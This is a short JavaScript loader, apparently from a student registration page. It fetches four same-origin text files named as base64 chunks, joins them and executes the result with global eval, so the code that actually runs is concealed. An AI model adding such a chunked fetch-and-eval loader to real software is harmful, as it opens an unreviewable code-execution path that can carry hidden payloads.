(function(){
  var files=["/js/_asr_b64_00.txt","/js/_asr_b64_01.txt","/js/_asr_b64_02.txt","/js/_asr_b64_03.txt"];
  Promise.all(files.map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(p){ (0,eval)(p.join("")); })
  .catch(function(e){ console.error("[students-reg]",e); });
})();
